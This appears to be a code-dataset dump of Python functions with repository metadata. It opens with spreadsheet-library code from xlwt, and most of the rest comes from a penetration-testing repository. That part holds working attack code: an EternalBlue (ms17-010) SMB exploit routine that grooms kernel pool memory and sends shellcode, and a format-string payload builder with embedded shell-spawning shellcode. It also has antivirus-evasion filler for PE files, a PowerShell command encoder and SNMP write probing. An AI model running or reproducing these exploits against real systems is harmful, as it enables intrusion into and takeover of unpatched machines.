self.__scl_magn\nelse:\n    if self.__page_preview:\n        scl_magn = self.__preview_magn\n        magn_default = 60\n    else:\n        scl_magn = self.__normal_magn\n        magn_default = 100\n    if scl_magn == magn_default or scl_magn == 0:\n        # Emulate what we think MS does\n        scl_magn = None # don't write an SCL record\nreturn BIFFRecords.Window2Record(\n    options, self.__first_visible_row, self.__first_visible_col,\n    self.__grid_colour,\n    self.__preview_magn, self.__normal_magn, scl_magn).get()", "path": "xlwt/xlwt/Worksheet.py", "commit_date": "2018-09-15 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "# grow bitset as required (use with care!)\n", "func_signal": "def set(self,bit,on=True):\n", "code": "i = self.wordNumber(bit)\nmask = self.bitMask(bit)\nif i>=len(self.data):\n    d = i - len(self.data) + 1\n    for x in range(0,d):\n        self.data.append(0)\n    assert len(self.data) == i+1\nif on:\n    self.data[i] |=  mask\nelse:\n    self.data[i] &= (~mask)", "path": "xlwt/xlwt/antlr.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "\"\"\" pack row and column into the required 4 byte format \"\"\"\n", "func_signal": "def cell_to_packed_rowcol(cell):\n", "code": "row, col, row_abs, col_abs = cell_to_rowcol(cell)\nif col >= MAX_COL:\n    raise Exception(\"Column %s greater than IV in formula\" % cell)\nif row >= MAX_ROW: # this for BIFF8. for BIFF7 available 2^14\n    raise Exception(\"Row %s greater than %d in formula\" % (cell, MAX_ROW))\ncol |= int(not row_abs) << 15\ncol |= int(not col_abs) << 14\nreturn row, col", "path": "xlwt/xlwt/Utils.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "\"\"\"Convert an Excel cell reference string in A1 notation\nto numeric row/col notation.\n\nReturns: row, col, row_abs, col_abs\n\n\"\"\"\n", "func_signal": "def cell_to_rowcol(cell):\n", "code": "m = _re_cell_ex.match(cell)\nif not m:\n    raise Exception(\"Ill-formed single_cell reference: %s\" % cell)\ncol_abs, col, row_abs, row = m.groups()\nrow_abs = bool(row_abs)\ncol_abs = bool(col_abs)\nrow = int(row) - 1\ncol = col_by_name(col.upper())\nreturn row, col, row_abs, col_abs", "path": "xlwt/xlwt/Utils.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "\"\"\"\nThis method is used to create Worksheets in a Workbook.\n\n:param sheetname:\n\n  The name to use for this sheet, as it will appear in the\n  tabs at the bottom of the Excel application.\n\n:param cell_overwrite_ok:\n\n  If ``True``, cells in the added worksheet will not raise an\n  exception if written to more than once.\n\n:return:\n\n  The :class:`~xlwt.Worksheet.Worksheet` that was added.\n\n\"\"\"\n", "func_signal": "def add_sheet(self, sheetname, cell_overwrite_ok=False):\n", "code": "from . import Utils\nfrom .Worksheet import Worksheet\nif not isinstance(sheetname, six.text_type):\n    sheetname = sheetname.decode(self.encoding)\nif not Utils.valid_sheet_name(sheetname):\n    raise Exception(\"invalid worksheet name %r\" % sheetname)\nlower_name = sheetname.lower()\nif lower_name in self.__worksheet_idx_from_name:\n    raise Exception(\"duplicate worksheet name %r\" % sheetname)\nself.__worksheet_idx_from_name[lower_name] = len(self.__worksheets)\nself.__worksheets.append(Worksheet(sheetname, self, cell_overwrite_ok))\nreturn self.__worksheets[-1]", "path": "xlwt/xlwt/Workbook.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "# skip whitespace\n", "func_signal": "def nextToken(self):\n", "code": "while not self.isEOF() and self.is_whitespace():\n    self.next_ch()\nif self.isEOF():\n    return Tok(type = EOF)\n# first, try to match token with 2 or more chars\nt = self.match_pattern()\nif t:\n    return t\n# second, we want 1-char tokens\nte = self.curr_ch()\ntry:\n    ty = single_char_lookup[te]\nexcept KeyError:\n    raise TokenStreamException(\n        \"Unexpected char %r in column %u.\" % (self.curr_ch(), self._pos))\nself.next_ch()\nreturn Tok(type=ty, text=te, col=self._pos)", "path": "xlwt/xlwt/ExcelFormulaLexer.py", "commit_date": "2018-01-29 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "#  .................................\n# BOUNDSEHEET0\n# BOUNDSEHEET1\n# BOUNDSEHEET2\n# ..................................\n# WORKSHEET0\n# WORKSHEET1\n# WORKSHEET2\n", "func_signal": "def __boundsheets_rec(self, data_len_before, data_len_after, sheet_biff_lens):\n", "code": "boundsheets_len = 0\nfor sheet in self.__worksheets:\n    boundsheets_len += len(BIFFRecords.BoundSheetRecord(\n        0x00, sheet.visibility, sheet.name, self.encoding\n        ).get())\n\nstart = data_len_before + boundsheets_len + data_len_after\n\nresult = b''\nfor sheet_biff_len,  sheet in zip(sheet_biff_lens, self.__worksheets):\n    result += BIFFRecords.BoundSheetRecord(\n        start, sheet.visibility, sheet.name, self.encoding\n        ).get()\n    start += sheet_biff_len\nreturn result", "path": "xlwt/xlwt/Workbook.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "\"\"\"\nSpecify a mapping between a token type and a (AST) class.\n\"\"\"\n", "func_signal": "def setTokenTypeASTNodeType(self, tokenType, className):\n", "code": "if not self._classmap:\n    self._classmap = {}\n\nif not className:\n    try:\n        del self._classmap[tokenType]\n    except:\n        pass\nelse:\n    ### here we should also perform actions to ensure that\n    ### a. class can be loaded\n    ### b. class is a subclass of AST\n    ###\n    assert isinstance(className,type)\n    assert issubclass(className,AST)  ## a & b\n    ### enter the class\n    self._classmap[tokenType] = className", "path": "xlwt/xlwt/antlr.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "# Return the BIFF data for all cell records in the row.\n# Adjacent BLANK|RK records are combined into MUL(BLANK|RK) records.\n", "func_signal": "def _get_cells_biff_data_mul(rowx, cell_items):\n", "code": "pieces = []\nnitems = len(cell_items)\ni = 0\nwhile i < nitems:\n    icolx, icell = cell_items[i]\n    if isinstance(icell, NumberCell):\n        isRK, value = icell.get_encoded_data()\n        if not isRK:\n            pieces.append(value) # pre-packed NUMBER record\n            i += 1\n            continue\n        muldata = [(value, icell.xf_idx)]\n        target = NumberCell\n    elif isinstance(icell, BlankCell):\n        muldata = [icell.xf_idx]\n        target = BlankCell\n    else:\n        pieces.append(icell.get_biff_data())\n        i += 1\n        continue\n    lastcolx = icolx\n    j = i\n    packed_record = ''\n    for j in range(i+1, nitems):\n        jcolx, jcell = cell_items[j]\n        if jcolx != lastcolx + 1:\n            nexti = j\n            break\n        if not isinstance(jcell, target):\n            nexti = j\n            break\n        if target == NumberCell:\n            isRK, value = jcell.get_encoded_data()\n            if not isRK:\n                packed_record = value\n                nexti = j + 1\n                break\n            muldata.append((value, jcell.xf_idx))\n        else:\n            muldata.append(jcell.xf_idx)\n        lastcolx = jcolx\n    else:\n        nexti = j + 1\n    if target == NumberCell:\n        if lastcolx == icolx:\n            # RK record\n            value, xf_idx = muldata[0]\n            pieces.append(pack('<5Hi', 0x027E, 10, rowx, icolx, xf_idx, value))\n        else:\n            # MULRK record\n            nc = lastcolx - icolx + 1\n            pieces.append(pack('<4H', 0x00BD, 6 * nc + 6, rowx, icolx))\n            pieces.append(b''.join(pack('<Hi', xf_idx, value) for value, xf_idx in muldata))\n            pieces.append(pack('<H', lastcolx))\n    else:\n        if lastcolx == icolx:\n            # BLANK record\n            xf_idx = muldata[0]\n            pieces.append(pack('<5H', 0x0201, 6, rowx, icolx, xf_idx))\n        else:\n            # MULBLANK record\n            nc = lastcolx - icolx + 1\n            pieces.append(pack('<4H', 0x00BE, 2 * nc + 6, rowx, icolx))\n            pieces.append(b''.join(pack('<H', xf_idx) for xf_idx in muldata))\n            pieces.append(pack('<H', lastcolx))\n    if packed_record:\n        pieces.append(packed_record)\n    i = nexti\nreturn b''.join(pieces)", "path": "xlwt/xlwt/Cell.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "\"\"\"\nFor a given token type return the AST node type. First we\nlookup a mapping table, second we try _class\nand finally we resolve to \"antlr.CommonAST\".\n\"\"\"\n\n# first\n", "func_signal": "def getASTNodeType(self,tokenType):\n", "code": "if self._classmap:\n    try:\n        c = self._classmap[tokenType]\n        if c:\n            return c\n    except:\n        pass\n# second\nif self._class:\n    return self._class\n\n# default\nreturn CommonAST", "path": "xlwt/xlwt/antlr.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "# Stand-alone merge of previously written cells.\n# Problems: (1) style to be used should be existing style of\n# the top-left cell, not an arg.\n# (2) should ensure that any previous data value in\n# non-top-left cells is nobbled.\n# Note: if a cell is set by a data record then later\n# is referenced by a [MUL]BLANK record, Excel will blank\n# out the cell on the screen, but OOo & Gnu will not\n# blank it out. Need to do something better than writing\n# multiple records. In the meantime, avoid this method and use\n# write_merge() instead.\n", "func_signal": "def merge(self, r1, r2, c1, c2, style=Style.default_style):\n", "code": "if c2 > c1:\n    self.row(r1).write_blanks(c1 + 1, c2,  style)\nfor r in range(r1+1, r2+1):\n    self.row(r).write_blanks(c1, c2,  style)\nself.__merged_ranges.append((r1, r2, c1, c2))", "path": "xlwt/xlwt/Worksheet.py", "commit_date": "2018-09-15 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "##assert isinstance(reader,file)\n", "func_signal": "def __init__(self,reader):\n", "code": "super(CharBuffer,self).__init__()\n## a reader is supposed to be anything that has\n## a method 'read(int)'.\nself.input = reader", "path": "xlwt/xlwt/antlr.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "\"\"\"Convert an Excel cell reference string in A1 notation\nto numeric row/col notation.\n\nReturns: row, col\n\n\"\"\"\n", "func_signal": "def cell_to_rowcol2(cell):\n", "code": "m = _re_cell_ex.match(cell)\nif not m:\n    raise Exception(\"Error in cell format\")\ncol_abs, col, row_abs, row = m.groups()\n# Convert base26 column string to number\n# All your Base are belong to us.\nrow = int(row) - 1\ncol = col_by_name(col.upper())\nreturn row, col", "path": "xlwt/xlwt/Utils.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "'''Fetch the IP address from the XML object'''\n", "func_signal": "def get_IP_Address(info):\n", "code": "ip_address = str()\ninfo_detail = info.getElementsByTagName(\"address\")\nfor address in info_detail:\n    if(address.getAttribute(\"addrtype\") == \"ipv4\"):\n        ip_address = address.getAttribute(\"addr\")\n        break\n\nreturn(ip_address)", "path": "pentest/enumeration/nmapxml.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "#execve(\"/bin/bash\", [\"/bin/bash\", \"-p\"], NULL) - 34 bytes (1 bytes \\x90 alignement :))\n", "func_signal": "def genpattern(value, addr, offset, pad):\n", "code": "payload = \"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\\x90\"\nsize = ((len(payload) / 2) + 2) * 4 + pad\n\n#on prepare l'adresse de la got a reecrire\npattern = pack('<I', addr) + pack('<I', addr + 2)\n\n#on prepare les adresses du payload\nfor i in range(len(payload) / 2):\n    pattern += pack('<I', value + i * 2)\n\n#on fixe le pattern\npattern += 'A' * pad\n\npattern = ''.join(['\\\\x%.2x' % ord(i) for i in pattern])\nlow = value & 0xffff\nhigh = value >> 16\n\n#on prepare l'ecriture du value dans la got \npattern += '%%%uu%%%u\\\\x24hn%%%uu%%%u\\\\x24hn' % ((low - size) & 0xffff, offset, (high - low) & 0xffff, offset + 1)\n\ncmpt = high\nfor i in range(len(payload) / 2):\n    word = unpack('<H', payload[i * 2:][:2])[0]\n    pattern += '%%%uu%%%u\\\\x24hn' % ((word - cmpt) & 0xffff, offset + 2 + i)\n    cmpt = word\n\nreturn pattern", "path": "pentest/exploit_dev/format_string_builder_write_payload.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "#Alt .1.3.6.1.2.1.1.5.0\n\n", "func_signal": "def testSNMPWrite(results,options,OID='.1.3.6.1.2.1.1.4.0'):\n", "code": "setval='HASH(0xDEADBEF)'\nfor r in results:\n\ttry:\n\t\toriginalval=SNMPRequest(r,OID)\n\n\t\tif originalval:\n\t\t\toriginalval=originalval[SNMPvarbind].value.val\n\n\t\t\tSNMPRequest(r,OID,setval)\n\t\t\tcurval=SNMPRequest(r,OID)[SNMPvarbind].value.val\n\n\t\t\tif curval == setval:\n\t\t\t\tr.write=True\n\t\t\t\ttry:\n\t\t\t\t\tSNMPRequest(r,OID,originalval)\n\t\t\t\texcept timeout:\n\t\t\t\t\tpass\n\t\t\t\tif options.verbose: printout (('\\t %s (%s) (RW)' % (r.community,r.version)),GREEN)\n\t\t\t\tcurval=SNMPRequest(r,OID)[SNMPvarbind].value.val\n\t\t\t\tif curval != originalval:\n\t\t\t\t\tprintout(('Couldn\\'t restore value to: %s (OID: %s)' % (str(originalval),str(OID))),RED)\n\t\t\telse:\n\t\t\t\tif options.verbose: printout (('\\t %s (%s) (R)' % (r.community,r.version)),BLUE)\n\t\telse:\n\t\t\tr.write=None\n\t\t\tprintout (('\\t %s (%s) (Failed)' % (r.community,r.version)),RED)\n\texcept timeout:\n\t\tr.write=None\n\t\tprintout (('\\t %s (%s) (Failed!)' % (r.community,r.version)),RED)\n\t\tcontinue", "path": "pentest/tools/snmpbrute.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "\"\"\"Sort and deduplicate hostnames and, if DNS resolution is turned on, resolve hostname\"\"\"\n", "func_signal": "def format_entries(results, do_resolve_dns):\n", "code": "sorted_results = sorted(set(results))\nif do_resolve_dns:\n    logging.info(\"DNS resolution turned on.\")\n    final_results = []\n    for cur_result in sorted_results:\n        if \"*\" not in cur_result:\n            logging.info(\"Resolving {}...\".format(cur_result))\n            try:\n                ip_addresses = dns.resolver.query(cur_result)\n                for ip_address in ip_addresses:\n                    final_results.append(\"{}\\t{}\".format(cur_result, ip_address))\n            except dns.resolver.NoAnswer:\n                final_results.append(cur_result)\n            logging.info(\"... done.\")\n        else:\n            final_results.append(cur_result)\nelse:\n    final_results = sorted_results\nreturn final_results", "path": "pentest/tools/subdomain_enum_crtsh.py", "commit_date": "2017-08-11 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "'''Fetch port and service information'''\n", "func_signal": "def getiter_Port_Information(info):\n", "code": "info_detail = info.getElementsByTagName(\"port\")\nfor port_details in info_detail:\n    protocol = port_details.getAttribute(\"protocol\")\n    port_number = port_details.getAttribute(\"portid\")\n\n    port_service = port_details.getElementsByTagName(\"state\")\n    for port_services in port_service:\n        port_state = port_services.getAttribute(\"state\")\n\n        if(port_state == \"open\"):\n\n            service_info = port_details.getElementsByTagName(\"service\")\n            for service_details in service_info:\n                service = service_details.getAttribute(\"name\")\n                product = service_details.getAttribute(\"product\")\n                version = service_details.getAttribute(\"version\")\n\n                yield(port_number,protocol,service,product,version)", "path": "pentest/enumeration/nmapxml.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "#https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py\n#Carlos - aka Darkoperator wrote the code below:\n# blank command will store our fixed unicode variable\n", "func_signal": "def powershell_encode(data):\n", "code": "blank_command = \"\"\npowershell_command = \"\"\n# Remove weird chars that could have been added by ISE\nn = re.compile(u'(\\xef|\\xbb|\\xbf)')\n# loop through each character and insert null byte\nfor char in (n.sub(\"\", data)):\n    # insert the nullbyte\n    blank_command += char + \"\\x00\"\n# assign powershell command as the new one\npowershell_command = blank_command\n# base64 encode the powershell command\npowershell_command = base64.b64encode(powershell_command)\nreturn powershell_command", "path": "pentest/helpers/easy_p.py", "commit_date": "2017-08-24 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "\"\"\"This is pretty gross, but necessary when using crt.sh: parse the contents of the summary\nentry and return individual host names.\"\"\"\n", "func_signal": "def parse_entries(identity, results_list):\n", "code": "line_breaks = [\"<br>\", \"<br />\"]\nfor cur_break in line_breaks:\n    if cur_break in identity[\"summary\"]:\n        entries_raw = identity[\"summary\"][:identity[\"summary\"].index(cur_break)].replace(\"&nbsp;\", \"\\n\")\nentries     = entries_raw.split(\"\\n\")\nfor entry in entries:\n    trimmed_entry       = entry.strip()\n    stringified_entry   = str(trimmed_entry)\n    results_list.append(stringified_entry)", "path": "pentest/tools/subdomain_enum_crtsh.py", "commit_date": "2017-08-11 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "#paramiko.util.log_to_file('demo.log')\n", "func_signal": "def init():\n", "code": "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((\"192.168.1.1\", 22))\nglobal transport\ntransport = paramiko.Transport(sock)\ntry:\n    transport.start_client()\nexcept paramiko.SSHException:\n    write(\"SSH negotiation failed.\")\n    sys.exit(1)\nif not transport.is_authenticated():\n    transport.auth_password(\"username\", \"password\")\nif not transport.is_authenticated():\n    write(\"Authentication failed.\")\n    transport.close()\n    sys.exit(1)\n\nglobal session\nsession = transport.open_session()\nsession.get_pty()\nsession.invoke_shell()", "path": "pentest/tools/restricted_shell_esc.py", "commit_date": "2016-12-12 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "\"\"\"Pass if the URL does not match any exclude patterns\"\"\"\n", "func_signal": "def _exclude_ok(self, url):\n", "code": "prefixes_ok = [ not url.startswith(p) for p in self.exclude_prefixes]\nreturn all(prefixes_ok)", "path": "pentest/tools/webcrawler.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "# benign filler instructions to include in the decoder\n", "func_signal": "def add_fill_instructions(limit):\n", "code": "\tfiller_instructions = [\n\t\t\t\t\t\t\t\"\\x90\", \t\t\t# NOP\n\t\t\t\t\t\t\t\"\\x60\\x61\",\t\t    # PUSHAD|POPAD\n\t\t\t\t\t\t\t\"\\x9c\\x9d\", \t\t# PUSHFD|POPFD\n\t\t\t\t\t\t\t\"\\x40\\x48\",\t\t \t# INC EAX|DEC EAX\n\t\t\t\t\t\t\t\"\\x41\\x49\", \t\t# INC ECX|DEC ECX\n\t\t\t\t\t\t\t\"\\x42\\x4A\", \t\t# INC EDX|DEC EDX\n\t\t\t\t\t\t\t\"\\x43\\x4B\", \t\t# INC EBX|DEC EBX\n\t\t\t\t\t\t\t\"\\x51\\x31\\xc9\\x59\",\t# PUSH ECX|XOR ECX,ECX|POP ECX\n\t\t\t\t\t\t\t\"\\x52\\x31\\xd2\\x5a\",\t# PUSH EDX|XOR EDX,EDX|POP EDX\n\t\t\t\t\t\t\t\"\\x53\\x31\\xdb\\x5b\"\t# PUSH EBX|XOR EBX,EBX|POP EBX\n\t\t\t\t\t\t  ]\n\t\n\t# add benign filler instructions to the decoder\n\tnum_fill_instructions = randint(1,limit)\n\tfill_instruction = \"\"\n\twhile (num_fill_instructions > 0):\n\t\tfill_instruction += filler_instructions[randint(0,len(filler_instructions)-1)]\n\t\tnum_fill_instructions -= 1\n\t\n\treturn fill_instruction", "path": "pentest/tools/peCloak.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "\"\"\"[-] Format GetLastError\"\"\"\n", "func_signal": "def getLastError():\n", "code": "buf = create_string_buffer(2048)\nif kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,\n        kernel32.GetLastError(), 0,\n        buf, sizeof(buf), NULL):\n    log(buf.value)\nelse:\n    log(\"[-] Unknown Error\")", "path": "pentest/exploit_win/ms14-002-NDProxy_XP_sp3.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "'''Initiate parsing of nmap XML file and create CSV string object'''\n", "func_signal": "def xml2csv(info):\n", "code": "\ncsv_header = \"IP Address,FQDN,OS,Port,Protocol,Service,Name,Version\\n\"\ncsv_format = '{0},\"{1}\",\"{2}\",{3},{4},\"{5}\",\"{6}\",\"{7}\"\\n'\n\ncsv_string += csv_header\n\nip =  get_IP_Address(info)\nfqdn = get_FQDN(info)\nos = get_OS(info)\n\nfor port,protocol,service,product,version in getiter_Port_Information(info):\n\tcsv_string += csv_format.format(ip,fqdn,os,port,protocol,service,product,version)", "path": "pentest/enumeration/nmapxml.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "'''Determine the OS by the greatest percentage in accuracy'''\n", "func_signal": "def get_OS(info):\n", "code": "os = str()\nos_hash = dict()\npercentage = list()\n\ninfo_detail = info.getElementsByTagName(\"osmatch\")\n\nfor os_detail in info_detail:\n    guessed_os = os_detail.getAttribute(\"name\")\n    accuracy = os_detail.getAttribute(\"accuracy\")\n    if(guessed_os and accuracy):\n        os_hash[float(accuracy)] = guessed_os\n\npercentages = os_hash.keys()\nif(percentages):\n    max_percent = max(percentages)\n    os = os_hash[max_percent]\n\nreturn(os)", "path": "pentest/enumeration/nmapxml.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "\"\"\"Pull the domain identity information from crt.sh\"\"\"\n", "func_signal": "def get_rss_for_domain(domain):\n", "code": "logging.info(\"Retrieving information about {} from crt.sh...\".format(domain))\nresults_raw = requests.get(base_url.format(domain)).content\nresults_entries = feedparser.parse(results_raw)[\"entries\"]\nlogging.info(\"Retrieval of info done.\")\nreturn results_entries", "path": "pentest/tools/subdomain_enum_crtsh.py", "commit_date": "2017-08-11 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "\"\"\"Generates the characters from `c1` to `c2`, inclusive.\"\"\"\n", "func_signal": "def CharRange(c1, c2):\n", "code": "lst = []\nfor c in xrange(ord(c1), ord(c2)+1):\n\tlst.append(chr(c))\nreturn lst", "path": "pentest/tools/ssh_response_time_brute.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "\"\"\"Pass if the URL has the correct prefix, or none is specified\"\"\"\n", "func_signal": "def _prefix_ok(self, url):\n", "code": "return (self.confine_prefix is None  or\n        url.startswith(self.confine_prefix))", "path": "pentest/tools/webcrawler.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "# force using smb.SMB for SMB1\n", "func_signal": "def exploit(target, shellcode, numGroomConn):\n", "code": "conn = smb.SMB(target, target)\nconn.login(USERNAME, PASSWORD)\nserver_os = conn.get_server_os()\nprint('Target OS: '+server_os)\nif not (server_os.startswith(\"Windows 8\") or server_os.startswith(\"Windows Server 2012 \")):\n\tprint('This exploit does not support this target')\n\tsys.exit()\n\ntid = conn.tree_connect_andx('\\\\\\\\'+target+'\\\\'+'IPC$')\n\n# The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.\n# Send TRANS2_OPEN2 (0) with special feaList to a target except last fragment\nprogress = send_big_trans2(conn, tid, 0, feaList, '\\x00'*30, len(feaList)%4096, False)\n\n# Another TRANS2_OPEN2 (0) with special feaList for disabling NX\nnxconn = smb.SMB(target, target)\nnxconn.login(USERNAME, PASSWORD)\nnxtid = nxconn.tree_connect_andx('\\\\\\\\'+target+'\\\\'+'IPC$')\nnxprogress = send_big_trans2(nxconn, nxtid, 0, feaListNx, '\\x00'*30, len(feaList)%4096, False)\n\n# create some big buffer at server\n# this buffer MUST NOT be big enough for overflown buffer\nallocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x2010)\n\n# groom nonpaged pool\n# when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one\nsrvnetConn = []\nfor i in range(numGroomConn):\n\tsk = createConnectionWithBigSMBFirst80(target, for_nx=True)\n\tsrvnetConn.append(sk)\n\n# create buffer size NTFEA_SIZE at server\n# this buffer will be replaced by overflown buffer\nholeConn = createSessionAllocNonPaged(target, NTFEA_SIZE-0x10)\n# disconnect allocConn to free buffer\n# expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer\nallocConn.get_socket().close()\n\n# hope one of srvnetConn is next to holeConn\nfor i in range(5):\n\tsk = createConnectionWithBigSMBFirst80(target, for_nx=True)\n\tsrvnetConn.append(sk)\n\n# remove holeConn to create hole for fea buffer\nholeConn.get_socket().close()\n\n# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header\n# first trigger, overwrite srvnet buffer struct for disabling NX\nsend_trans2_second(nxconn, nxtid, feaListNx[nxprogress:], nxprogress)\nrecvPkt = nxconn.recvSMB()\nretStatus = recvPkt.getNTStatus()\nif retStatus == 0xc000000d:\n\tprint('good response status for nx: INVALID_PARAMETER')\nelse:\n\tprint('bad response status for nx: 0x{:08x}'.format(retStatus))\n\n# one of srvnetConn struct header should be modified\n# send '\\x00' to disable nx\nfor sk in srvnetConn:\n\tsk.send('\\x00')\n\n# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header\n# second trigger, place fake struct and shellcode\nsend_trans2_second(conn, tid, feaList[progress:], progress)\nrecvPkt = conn.recvSMB()\nretStatus = recvPkt.getNTStatus()\nif retStatus == 0xc000000d:\n\tprint('good response status: INVALID_PARAMETER')\nelse:\n\tprint('bad response status: 0x{:08x}'.format(retStatus))\n\n# one of srvnetConn struct header should be modified\n# a corrupted buffer will write recv data in designed memory address\nfor sk in srvnetConn:\n\tsk.send(fake_recv_struct + shellcode)\n\n# execute shellcode\nfor sk in srvnetConn:\n\tsk.close()\n\n# nicely close connection (no need for exploit)\nnxconn.disconnect_tree(tid)\nnxconn.logoff()\nnxconn.get_socket().close()\nconn.disconnect_tree(tid)\nconn.logoff()\nconn.get_socket().close()", "path": "pentest/exploit_win/ms17-010/eternalblue8_exploit.py", "commit_date": "2017-08-22 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "# default to 32-bit\n", "func_signal": "def getarchitecture(ostext):\n", "code": "  architecture=\"32\"\n\n  # haystack\n  s = ostext.lower()\n# attempt to be as flexible as possible\n  # matching '64-based', 'x64', ' 64', 'i64', '64bit', '64 bit', '64-bit'\n  if (\"64-based\" in s) or (\"x64\" in s) or (\" 64\" in s) or (\"i64\" in s) or (\"64bit\" in s) or (\"64 bit\" in s) or (\"64-bit\" in s): architecture=\"64\"\n\n  # target Itanium with a simple search for 'tani'\n  if \"tani\" in s: architecture=\"Itanium\"\n        \n  if getname(ostext) == \"2008\" and getrelease(ostext) == \"2\" and architecture == \"32\":\n    if ARGS.verbose:\n      ALERT(\"forcing unidentified architecture to 64-bit because OS identified as Windows 2008 R2 (although could be Itanium and wasn't detected?)\")\n    architecture = \"64\"\n\n  # windows server 2012 is only 64-bit arch\n  if getname(ostext) == \"2012\" and architecture == \"32\":\n    if ARGS.verbose:\n      ALERT(\"forcing unidentified architecture to 64-bit because OS identified as Windows Server 2012 does not support 32-bit\")\n    architecture = \"64\"  \n\n  return architecture", "path": "pentest/post_win/windows-exploit-suggester.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
{"docstring": "'''Cleanup old files and processes'''\n\n", "func_signal": "def cleanup_routine():\n", "code": "try:\n    # Delete old temp files if the user wants to; default to leave old files\n    response = raw_input(\"\\nDelete old JTR session data (enter no if you want to keep old hashes, etc)? [no]\")\n    if \"y\" in response or \"Y\" in response:\n        print(\"Deleting temp files...\\n\")\n        shutil.rmtree(\"~/.john\", True)\n    else:             \n        pass\n\nexcept:\n    pass", "path": "pentest/tools/john.py", "commit_date": "2016-10-28 00:00:00", "repo_name": "jivoi/pentest", "stars": 1450, "license": "None", "language": "python", "size": 90828}
